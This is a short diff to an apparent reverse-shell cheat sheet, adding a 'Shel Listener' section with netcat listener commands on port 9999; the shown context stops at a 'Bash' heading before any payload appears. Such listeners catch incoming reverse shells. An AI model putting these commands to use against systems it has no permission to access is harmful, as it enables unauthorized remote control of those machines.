@@ -1,4 +1,14 @@
 # Various Reverse Shells
+# Shel Listener
+```
+nc -lvp 9999
+```
+###
+###
+```
+nc -A -l 9999
+```
+###
 
 # Bash
 ```
